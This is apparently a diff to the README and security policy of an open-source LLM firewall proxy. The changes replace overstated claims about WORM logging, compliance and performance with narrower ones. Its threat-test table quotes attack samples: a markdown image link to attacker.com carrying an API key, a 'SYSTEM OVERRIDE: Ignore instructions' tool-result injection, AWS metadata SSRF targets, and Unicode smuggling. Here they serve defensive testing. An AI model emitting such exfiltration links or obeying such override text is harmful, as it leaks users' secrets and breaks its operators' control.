@@ -12,7 +12,7 @@ LLM-Shield-Proxy provides comprehensive mitigation for **8 out of the 10** criti
 | **LLM01: Prompt Injection** | Mitigated by `INDIRECT_PROMPT_INJECTION_PATTERN` and AST-Aware Semantic Firewall. |
 | **LLM02: Insecure Output Handling** | Mitigated by JSON Recursion Bomb Defense and XSS/Markdown Exfiltration blockers. |
 | **LLM04: Model Denial of Service** | Mitigated by Slowloris Buffer limits, `64KB` Backpressure Guards, and `max_tokens` limits. |
-| **LLM05: Supply Chain Vulnerabilities** | Addressed by WORM-Compliant Cryptographic Attestation for all outbound requests, proving un-tampered egress. |
+| **LLM05: Supply Chain Vulnerabilities** | Supported by signed stream receipts and tamper-evident audit evidence; deployment and software-supply-chain controls remain required. |
 | **LLM06: Sensitive Information Disclosure** | Mitigated by 3-Tier Redaction Cascade (DFA Regex, Shannon Entropy, ONNX NER) and Stateless Synthetic. |
 | **LLM07: Insecure Plugin Design** | Mitigated by the Edge-Level Agent Identity Enforcer (JWT/DPoP) and Autonomous Agent Circuit Breakers. |
 | **LLM08: Excessive Agency** | Mitigated by Granular Entity Policy Scopes (Role-Based Access Controls) restricting tool calls deterministically. |
@@ -27,17 +27,17 @@ LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhausti
 | **Early Stream Termination** | Client aborts or upstream disconnects mid-stream. | Deterministic `finally` buffer flush + upstream connection teardown. | ✅ **PASSED** (`test_rehydrate_sse_stream_generator`) |
 | **Unicode Smuggling** | Zero-width spaces (`j​ohn@doe.com`, `555​-44-3333`). | `normalize_and_desmuggle()` removes invisible format characters + NFKC normalization. | ✅ **PASSED** (`test_unicode_zero_width_smuggling`) |
 | **BiDi / RTL Override Evasion** | Right-to-Left Override (`‮3333-44-555`). | Directional format controls (`‪-‮`, `⁠-⁩`) stripped before regex matching. | ✅ **PASSED** (`test_bidi_rtl_override_smuggling`) |
-| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Dual Shannon entropy scanner + base64 candidate payload inspection. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`) |
+| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Bounded inspection for text-sized values. For candidates over 8,192 characters, encoded interiors are skipped and 256-character boundary guards preserve adjacent plaintext detection. Image payloads are not decoded. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`, `test_dlp_redos_base64_obfuscation`, `test_oversized_base64_keeps_plaintext_boundary_detection`) |
 | **Markdown Image Exfiltration** | Prompt tricks LLM into outputting `![logo](https://attacker.com/leak?data=[API_KEY])`. | Outbound image sanitizer in `vault.rehydrate()` neutralizes query parameter leak URLs. | ✅ **PASSED** (`test_markdown_image_exfiltration_blocking`) |
 | **Tool Response Poisoning** | Malicious API/web results containing `"SYSTEM OVERRIDE: Ignore instructions"`. | `INDIRECT_PROMPT_INJECTION_PATTERN` neutralizes override tokens in `role: "tool"` content. | ✅ **PASSED** (`test_tool_response_indirect_prompt_injection_neutralization`) |
-| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request` in `&lt;1ms`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
+| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
 | **Slowloris Memory Ballooning** | Massive non-terminating streams attempting to exhaust RAM. | Bounded `64KB` buffer backpressure guard + `1MB` SSE line limit. | ✅ **PASSED** (`test_slowloris_buffer_backpressure_limit`) |
 | **CJK Sub-Word Collisions** | Continuous Chinese/Japanese text (`我的名字是Maya。`). | Script-aware boundary isolation allowing logographic replacements without whitespace. | ✅ **PASSED** (`test_cjk_multilingual_boundary_safety`) |
 | **Multi-Modal Content Arrays** | Multi-part vision message arrays with text and base64 images. | Universal content block unwrapping redacting text without altering image payloads. | ✅ **PASSED** (`test_multimodal_content_array_redaction`) |
 | **Timing Attacks on API Keys** | Key length and character leakage via string comparison timing. | Constant-time authentication verification using `hmac.compare_digest()`. | ✅ **PASSED** (`test_inbound_auth_validation`) |
 | **SSRF & Network Boundary** | Requests targeting `127.0.0.1`, AWS metadata (`169.254.169.254`), or private LANs. | Dynamic DNS resolution + IP blacklist rejecting loopback, link-local, and multicast IPs. | ✅ **PASSED** (`test_ssrf_rejection`) |
 | **Agent-Driven Infinite Loops** | Autonomous agents getting stuck in costly self-reflective loops. | Composite Agent Loop Circuit Breaker (`AGENT_BREAKER_THRESHOLD`). | ✅ **PASSED** (`test_composite_agent_loop_breaker`) |
-| **Audit Log Tampering** | Malicious actor modifies logs to cover up PII leak. | WORM-Compliant Cryptographic SHA-256 Hash Chaining. | ✅ **PASSED** (`test_worm_compliant_merkle_chaining`) |
+| **Audit Log Tampering** | Malicious actor modifies supplied evidence. | SHA-256 chaining, Ed25519 signatures, sequence checks, and optional durable delivery. | ✅ **PASSED** (`test_worm_compliant_merkle_chaining`); immutable retention is external |
 | **Insider Model Leaks** | Employees copying redacted/synthetic data to train local shadow IT models. | Dynamic Canary Watermarking & Steganography. | ✅ **PASSED** (`test_dynamic_canary_watermark_injection`) |
 | **Egress Spoofing** | Attacker claims proxy sent PII to upstream provider. | Cryptographic Proof of Non-Egress Cryptographic Attestation. | ✅ **PASSED** (`test_proof_of_non_egress_attestation`) |
 | **Vault Memory Dump** | Attacker gains memory dump of TTL session vault to steal mapped PII. | In-Band Stateless Syntheticgraphic Masking (AES-256-GCM). | ✅ **PASSED** (`test_stateless_synthetic_masking_vault_bypass`) |
@@ -69,7 +69,7 @@ LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhausti
 ### 🛑 Threat Prevention & Isolation
 
 #### Edge-Level Agent Identity Enforcer
-* **Implementation Details**: Acts as a strict cryptographic notary at the ingress boundary to prevent rogue agent escalation. Requires agents to present an unforgeable, mathematically signed Workload Identity (JWT) and Demonstrating Proof-of-Possession (DPoP) proof before executing tool calls. Identites are validated in `&lt;1ms` via cached JWKS and mathematically sealed into a WORM-compliant tamper-proof hash chain. See the [detailed documentation](docs/features/agent_identity_enforcer.md) for more info.
+* **Implementation Details**: Requires agents to present a signed Workload Identity (JWT) and Demonstrating Proof-of-Possession (DPoP) proof before executing tool calls. Validated identity metadata is recorded in the signed, tamper-evident audit chain. See the [detailed documentation](docs/features/agent_identity_enforcer.md) for more info.
 * **Flags**: [`AGENT_IDENTITY_ENFORCER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
 #### Autonomous Agent Security (Composite Agent Loop Circuit Breaker)
@@ -77,21 +77,21 @@ LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhausti
 * **Flags**: [`ENABLE_AGENT_BREAKER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`AGENT_BREAKER_THRESHOLD`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
 #### Granular Entity Policy Scopes & Zero Trust AI Defaults
-* **Implementation Details**: Ensures strict **AI Governance** by binding incoming requests instantly to department-level security profiles via Virtual Keys. Utilizes O(1) in-memory tenant profile mapping. The system operates on a strict `FAIL_CLOSED` **Zero Trust AI** default—if a policy resolution fails or the engine faults, the **LLM Firewall** drops the connection rather than failing open and leaking data.
+* **Implementation Details**: Ensures strict **AI Governance** by binding incoming requests instantly to department-level security profiles via Virtual Keys. Utilizes O(1) in-memory tenant profile mapping. The system operates on a strict `FAIL_CLOSED` **Zero Trust AI** default-if a policy resolution fails or the engine faults, the **LLM Firewall** drops the connection rather than failing open and leaking data.
 * **Flags**: [`VALID_VIRTUAL_KEYS`](deployment.md#core-configuration-flags), [`SHIELD_FAILURE_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
-#### Zero-Allocation Streaming JSON Lexer
-* **Implementation Details**: Defends against Slowloris and memory ballooning attacks by utilizing a Rust-backed (`orjson`) zero-allocation lexer. This processes massive multi-megabyte SSE stream lines without spiking the Resident Set Size (RSS), keeping memory strictly bounded below 60MB.
+#### Bounded Streaming JSON Lexer
+* **Implementation Details**: Limits retained parser state and SSE line size. Validate peak RSS with the published service-level protocol; the project does not claim a universal process-memory ceiling.
 * **Flags**: [`MAX_SSE_LINE_LENGTH`](deployment.md#core-configuration-flags)
 
 ### 📜 Audit, Forensics, and Compliance
 
-#### WORM-Compliant Cryptographic Attestation & Audit Logging
-* **Implementation Details**: Emits structured compliance events containing timestamps, tenant IDs, redacted entity types, and session metadata. The logs are Write-Once-Read-Many (WORM) compliant, generating mathematical proof that specific data never egressed the VPC boundaries.
+#### Tamper-Evident Cryptographic Attestation & Audit Logging
+* **Implementation Details**: Emits privacy-safe structured events containing timestamps, tenant IDs, entity categories, and session metadata. Records are signed and hash-linked. The default is a process-local best-effort chain; local durable JSONL is opt-in and is not WORM storage. Raw-PII boundary behavior is tested separately by the conformance harness.
 * **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
 #### Cryptographic SHA-256 Hash Chaining
-* **Implementation Details**: Every emitted audit log entry cryptographically signs and chains to the previous record's hash. This guarantees tamper-evidence; any post-facto modification or deletion of a log entry (e.g., to cover up a leak) will instantly invalidate the entire cryptographic chain, satisfying strict **SOC 2 Compliance for AI**, **ISO 42001 AI Management System** requirements, and HIPAA audit controls.
+* **Implementation Details**: Every emitted audit entry can be signed and linked to the predecessor hash. Verification detects edits, gaps, insertion, or reordering inside evidence received. An unanchored deleted suffix is not detectable from the shortened file, and these mechanics only support-not satisfy by themselves-SOC 2, ISO/IEC 42001, and HIPAA controls.
 * **Flags**: [`AUDIT_LOG_FORMAT`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
 #### Cryptographic Proof of Non-Egress Cryptographic Attestation
@@ -126,7 +126,7 @@ LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhausti
 * **Flags**: [`METRICS_BEARER_TOKEN`](deployment.md#core-configuration-flags)
 
 #### Zero-Overhead OpenTelemetry (OTel) Tracing
-* **Implementation Details**: Handles W3C `traceparent` distributed tracing propagation via a dedicated asynchronous background thread. Provides full observability to Jaeger or Datadog with strictly zero latency overhead to the active HTTP streaming loop, ensuring security monitoring never degrades LLM performance.
+* **Implementation Details**: Handles W3C `traceparent` propagation through a bounded asynchronous background path. Export configuration can still add CPU work, queue pressure, or drops and should be included in service-level tests.
 * **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
 
 #### Multi-Provider Translators & Anthropic Adapter
@@ -140,7 +140,7 @@ LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhausti
 # Security Policy & Vulnerability Reporting
 
 ## Security Overview
-LLM-Shield-Proxy is engineered for extreme zero-egress data privacy and enterprise compliance (SOC 2 / HIPAA). Security and confidentiality are core to the architecture.
+LLM-Shield-Proxy is engineered to support in-VPC privacy controls and SOC 2/HIPAA evidence collection. Security and confidentiality are core to the architecture; deployment and operation determine compliance.
 
 ## Supported Versions
 As an open-source project, **only the absolute latest release version** is actively supported with security updates.
@@ -166,4 +166,4 @@ Please include in your report:
 - Steps to reproduce or proof-of-concept payload/code.
 - Impact assessment.
 
-We aim to respond to security reports within 24–48 hours and release a patch expeditiously.
+We aim to respond to security reports within 24-48 hours and release a patch expeditiously.
